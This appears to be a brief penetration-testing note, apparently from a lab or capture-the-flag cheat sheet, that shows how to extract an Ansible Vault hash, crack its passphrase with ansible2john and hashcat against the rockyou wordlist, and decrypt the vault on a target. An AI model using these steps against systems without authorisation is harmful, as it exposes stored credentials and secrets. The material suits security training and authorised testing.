> Once we find an ansible hash we can copy and paste it to hash.yml on kali (make sure to tab over everything so its lined up) and convert it to a hash:

```
python3 /usr/share/john/ansible2john.py hash.yml 
```

> Now we paste the output in a file called test.txt starting from $ansible and crack it:

```
sudo hashcat test.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt 
```

> Now we can decrypt the vault on the target using the passphrase:

```
cat <ansible_hashfile> | ansible-vault decrypt
```
